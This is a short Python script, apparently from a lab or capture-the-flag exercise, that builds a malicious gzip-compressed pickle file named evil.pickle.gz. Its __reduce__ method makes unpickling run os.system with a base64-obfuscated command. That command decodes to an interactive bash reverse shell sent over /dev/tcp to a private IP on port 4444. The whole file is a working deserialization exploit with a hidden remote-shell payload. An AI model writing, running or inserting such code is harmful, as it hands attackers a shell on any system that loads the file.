# make_pickle.py
import pickle, gzip, os

class E:
    def __reduce__(self):
        b64cmd = "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi43NC80NDQ0IDA+JjE="
        cmd = f"echo {b64cmd} | base64 -d | bash"
        return (os.system, (cmd,))

data = pickle.dumps(E())
with gzip.open("evil.pickle.gz", "wb") as f:
    f.write(data)
print("Created evil.pickle.gz")
